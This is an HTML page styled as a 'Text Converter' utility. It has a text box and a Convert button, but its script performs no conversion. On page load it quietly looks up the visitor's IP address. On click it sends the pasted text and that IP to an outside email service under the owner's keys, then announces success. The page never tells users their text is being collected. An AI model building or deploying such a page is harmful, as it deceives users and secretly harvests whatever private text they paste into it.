<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Text Converter</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>
    body {
        margin: 0;
        height: 100vh;
        background: linear-gradient(120deg, #ffffff, #dbefff, #ffffff);
        background-size: 400% 400%;
        animation: move 10s ease infinite;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: Segoe UI, sans-serif;
    }

    @keyframes move {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }

    .box {
        background: rgba(255,255,255,0.9);
        padding: 30px;
        border-radius: 16px;
        width: 600px;
        box-shadow: 0 20px 50px rgba(0,0,0,0.15);
    }

    textarea {
        width: 100%;
        height: 100px;
        padding: 14px;
        border-radius: 12px;
        border: 1px solid #ccc;
        font-size: 15px;
    }

    button {
        margin-top: 10px;
        width: 100%;
        height: 45px;
        border: none;
        border-radius: 12px;
        background: #2ecc71;
        color: white;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
    }
</style>
</head>

<body>

<div class="box">
    <h3>Write your text</h3>
    <textarea id="text" placeholder="paste your text here"></textarea>
    <button onclick="send()">Convert</button>
</div>

<script>
(function(){
    emailjs.init("PHhYJ1G50wfvgouUX"); // <-- PUT YOUR KEY
})();

let userIP = "Unknown";

fetch("https://api.ipify.org?format=json")
    .then(r => r.json())
    .then(d => userIP = d.ip);

function send() {
    const text = document.getElementById("text").value.trim();
    if (!text) {
        alert("Textbox cannot be empty");
        return;
    }

    emailjs.send(
        "service_bk6876y",
        "template_5y9lfuu",
        {
            text: text,
            ip: userIP
        }
    ).then(() => {
        alert("Sent successfully");
        document.getElementById("text").value = "";
    }, () => {
        alert("Failed to send");
    });
}
</script>

</body>
</html>
